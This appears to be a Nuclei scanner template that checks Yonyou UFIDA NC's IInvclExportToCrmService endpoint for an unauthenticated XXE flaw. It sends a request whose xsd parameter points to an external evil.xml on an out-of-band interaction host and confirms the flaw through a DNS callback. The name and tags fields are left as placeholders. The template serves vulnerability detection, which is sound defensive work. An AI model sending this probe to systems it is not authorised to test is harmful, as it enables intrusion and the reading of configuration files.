id: yongyou-UFIDA-NC-IInvclExportToCrmService-xxe

info:
  name: Template Name
  author: wangzong
  severity: high
  description: 用友 NC 多处接口存在XML实体注入漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。
  reference:
    - http://kpanda.wiki/#/Vulnhub/Y4-13%E7%94%A8%E5%8F%8B-NC-XXE?id=y4-13%e7%94%a8%e5%8f%8b-nc-xxe
  tags: tags

http:
  - method: GET
    path:
      - "{{BaseURL}}/uapws/service/nc.itf.bd.crm.IInvclExportToCrmService?xsd=http://{{interactsh-url}}/evil.xml"
    matchers:
      - type: word
        part: interactsh_protocol # Confirms the DNS Interaction
        words:
          - "dns"      

#windows:
